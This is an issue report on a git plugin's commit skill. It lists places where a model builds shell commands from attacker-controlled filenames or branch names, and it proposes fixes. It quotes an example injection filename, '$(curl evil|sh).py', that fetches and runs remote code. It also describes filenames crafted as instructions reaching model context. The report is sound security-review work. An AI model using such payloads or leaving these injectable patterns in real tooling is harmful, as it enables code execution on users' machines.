## Summary
`commit/SKILL.md` has three remaining call sites where the model composes a shell command from a git-derived string that can be attacker-controlled (a filename from a fetched/contributed branch's working-tree content, or a branch name from a checked-out PR), plus one gap in the data-only-content boundary. A `plugin-lifecycle-downstream` QA pass on `git-kit` (2026-08-23/24) closed the original instance of this pattern (step 7's sensitive-file unstage) and a second instance found in review (step 7.5/8's lint/format/type-check and mirror-staging), across four rounds of `security-reviewer` passes, but the fourth round found this pattern recurring at yet another site (step 6) that was never in scope of rounds 1-3. Deferred here rather than attempting a fifth round.

## Environment
- **Product/Service**: `git-kit` plugin (this marketplace) — `commit` skill
- **Region/Version**: N/A
- **Browser/OS**: N/A

## Reproduction Steps
1. Read `plugins/git-kit/skills/commit/SKILL.md` step 6 ("Staging"): when the user has unstaged changes and picks a subset to stage, the model composes `git add <selected-files>` from filenames read out of `git status` — i.e. from working-tree paths. On a branch checked out from a fetched PR, those filenames are exactly as attacker-chosen as the *staged* filenames steps 7/7.5/8 now all treat as untrusted (fixed in this same QA pass), but step 6 carries none of that treatment: no script, no metacharacter denylist, not even the prose boundary the other steps state.
2. Read step 8's residual `git add -- <path>` for generated mirror-file staging: it's guarded only by a 16-character shell-metacharacter denylist the model must apply by hand before every call, rather than routed through a `--pathspec-from-file`/`--pathspec-file-nul` script (the pattern `unstage-flagged-files.sh` and `lint-staged-python.sh` already establish for steps 7 and 7.5). The denylist is complete for injection (covers every command-substitution vector) but omits `[`/`]` (glob over-match) and whitespace (path word-splitting).
3. Read step 16 ("Push"): `git push -u origin <branch>` is composed from a branch name. `git check-ref-format`'s forbidden-character set does not include `$`, `` ` ``, `(`, `)`, `;`, `|`, or `&` — so a branch name containing those may be a legal git ref, and after a `gh pr checkout` of a contributor's PR that name is attacker-chosen. Not independently live-verified whether git actually accepts such a ref name in practice (flagged `⚠️ Unverified` by the reviewing agent).
4. Read step 9's data-only boundary (added in this same QA pass): it explicitly covers "the diff content, and any filename the sensitive-file scan reports," but doesn't extend to the filenames `lint-staged-python.sh` prints in its own summary output (a filename crafted as an instruction could land in model context there, outside the stated boundary as literally written).

## Expected Behavior
Every point where the model reads a git-derived string (a working-tree filename, a branch name) and must act on it should either route through a script that avoids shell interpolation entirely (the `--pathspec-from-file`/`--pathspec-file-nul` pattern), or carry an explicit, complete prose boundary — never a hand-applied denylist as the sole guard, and never no guard at all.

## Actual Behavior
Step 6 has no guard of any kind on its `git add <selected-files>` composition — the most common interactive path in the skill (nothing staged yet, user names files to stage). Step 8's guard is a denylist a `model: haiku` skill must apply character-by-character. Step 16's branch-name composition was not audited for this pattern until round 4's review, and remains unfixed. Step 9's boundary doesn't literally cover a third script's filename output.

## Impact
**Step 6: High** — same command-injection class as the already-fixed step 7 finding (a filename like `$(curl evil|sh).py` would execute if the model composes it into a `git add` command string, even quoted), on the skill's single most common interactive path, not a corner case.
**Step 8, step 16: Medium** — mitigated-not-closed (step 8's denylist is injection-complete, just not over-match/word-split-complete) or unverified-but-plausible (step 16), lower likelihood than step 6 since generated-mirror filenames and branch names are more constrained than arbitrary working-tree filenames.
**Step 9: Low** — a documentation/scope gap in an otherwise-correct boundary, not a functional hole by itself.

## Additional Context
Found during a `plugin-lifecycle-downstream` full QA pass on `git-kit` (2026-08-23/24, this repo). Four `security-reviewer` rounds ran against `commit/SKILL.md`'s trust-boundary and command-injection surface in that session:
- Round 1: fixed the original fail-open trust-boundary bug (`issues/2026-08-22-commit-skill-ls-files-cwd-fail-open.md`, now resolved) plus 7 more findings from that pass.
- Round 2: found the step-7 unstage command was still injectable despite quoting (double quotes don't suppress `$(...)`/`` ` ` ``/`$VAR` expansion) — fixed via a new `scripts/unstage-flagged-files.sh` using `--pathspec-from-file`/`--pathspec-file-nul`, live-verified end-to-end with a `$(touch INJECTION_PROOF).key`-named test file.
- Round 3: found the identical pattern recurred at step 7.5/8 (`ruff`/`ty`/`git add` composed from staged `.py` paths) — fixed via a new `scripts/lint-staged-python.sh`, live-verified the same way, plus fixed 3 genuine functional bugs found in that script (an unfixable `ruff check` violation aborting the whole loop under `set -e`; a staged deletion crashing `ruff format`; a `*.py` pathspec silently narrowed by an incorrectly-applied `:(glob)` magic word — corrected to `:(top)`, live-verified both forms).
- Round 4: confirmed rounds 1-3's fixes are solid (smoke-test 20/20, rulebook check PASS, security review confirms the specific instances closed) but found the pattern recurs at step 6, plus the step 8/16/9 gaps above. Deferred here per the user's explicit decision rather than starting a fifth round.

Suggested fix for step 6 (highest priority): a new script following the `unstage-flagged-files.sh`/`lint-staged-python.sh` pattern — take the user's selected files (however the model has already parsed the selection), emit them NUL-separated with `:(top,literal)` prefixes, and call `git add --pathspec-from-file=- --pathspec-file-nul`.

Suggested fix for step 8: replace the denylist with the same `--pathspec-from-file` mechanism.

Suggested fix for step 16: resolve the branch name via `git rev-parse --abbrev-ref HEAD` immediately before the push rather than having the model retype/compose it, or add the same "never compose a shell command from this value" prose boundary the filename-handling steps now carry.

Suggested fix for step 9: broaden the data-only-boundary sentence to cover any filename reported by any of the three scripts (`scan-staged-files.sh`, `unstage-flagged-files.sh`, `lint-staged-python.sh`), not just the sensitive-file scan specifically.
